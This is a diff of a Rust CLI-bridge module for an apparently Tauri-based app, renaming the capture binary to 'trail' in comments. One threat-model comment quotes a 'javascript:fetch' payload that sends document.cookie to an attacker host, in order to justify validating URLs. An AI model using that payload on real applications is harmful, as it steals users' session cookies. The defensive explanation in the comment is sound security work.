@@ -1,5 +1,6 @@
-//! CLI bridge — typed subprocess invocation of `@synapti/trail-capture` (gh#11
-//! criterion 11; gh#12 Sprint 5).
+//! CLI bridge — typed subprocess invocation of the `trail` binary (gh#11
+//! criterion 11; gh#12 Sprint 5). The binary is installed by
+//! `npm install -g @synapti/trail-capture` (see that package's `bin` field).
 //!
 //! Sprint 4's decisions go through the in-Rust saga (B5 §3.1); the CLI
 //! bridge is the mechanism for invoking the capture binary for:
@@ -20,8 +21,8 @@
 //! P1 hardening, so the CLI's interactive prompt is bypassed).
 //!
 //! `capture_cli_path` from settings.json (B5 §6.6) is the path; default
-//! is `@synapti/trail-capture` (resolved via PATH; the user can override to a
-//! local node_modules/.bin/trail or an absolute path).
+//! is `trail` (resolved via PATH; the user can override to a local
+//! `node_modules/.bin/trail` or an absolute path).
 
 use regex::Regex;
 use serde::{Deserialize, Serialize};
@@ -36,7 +37,7 @@ use tracing::warn;
 ///
 /// The capture CLI's stderr is parsed into `pr_url` and rendered by
 /// `PacketView.tsx` as `<a href={postToast.pr_url}>`. A compromised or
-/// PATH-hijacked `@synapti/trail-capture` could emit
+/// PATH-hijacked `trail` binary could emit
 /// `posted packet to javascript:fetch('https://attacker/exfil?'+document.cookie)`
 /// — a single click on the post-success toast would execute script inside
 /// the webview (the CSP at `tauri.conf.json` does NOT block `javascript:`
@@ -96,7 +97,7 @@ pub struct CaptureVersion {
 ///
 /// Per gh#11 criterion 11 + 13 (no mocks): this IS the real subprocess
 /// invocation — there is no fallback to py-reference because Phase 1's
-/// `@synapti/trail-capture` is on main. If the binary is missing, return
+/// `trail` binary is on main. If the binary is missing, return
 /// `Spawn("...")` and the UI surfaces the error.
 pub fn probe_capture_version(bin: &str) -> Result<CaptureVersion, BridgeError> {
     let argv = ["--version"];
@@ -600,7 +601,7 @@ mod tests {
     // Cycle-1.5 F10 (P3): the cargo tests below use POSIX utilities
     // (echo / true / false / /nonexistent) to exercise the generic
     // subprocess primitives. End-to-end coverage of "UI → Tauri →
-    // cli_bridge → @synapti/trail-capture --version" requires a Playwright
+    // cli_bridge → trail --version" requires a Playwright
     // harness that points `capture_cli_path` at a node script
     // emitting "0.1.0-dev"; that's deferred to the Playwright spec
     // suite. The vitest M6SettingsModal-cli-bridge.test.tsx
